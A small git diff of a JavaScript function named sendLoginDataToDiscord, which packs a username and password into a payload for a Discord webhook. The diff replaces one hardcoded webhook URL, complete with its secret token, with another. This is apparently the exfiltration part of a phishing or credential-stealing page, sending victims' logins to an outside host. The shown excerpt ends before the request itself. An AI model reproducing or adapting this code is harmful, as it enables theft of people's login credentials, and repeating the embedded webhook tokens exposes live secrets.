@@ -1,6 +1,6 @@
 function sendLoginDataToDiscord(username, password) {
     // Replace with your Discord webhook URL
-    const discordWebhookURL = "https://discord.com/api/webhooks/1168919681680277604/W4yDWCJtoh5Lduy-wPAudxwEOHaaO0N86FR1DouQ7AqTNMB_iQpOmV-jrvDiM6ldkCdX";
+    const discordWebhookURL = "https://discord.com/api/webhooks/1169093827785674792/B0JWqdVM9KyFzZsgHVBbNzNsBFNP-X6AqmIKjwUXRbuDHTkFzSTYyoEK16r9NRbgEGL6";
 
     // Create a JSON payload with the username and password
     const payload = {
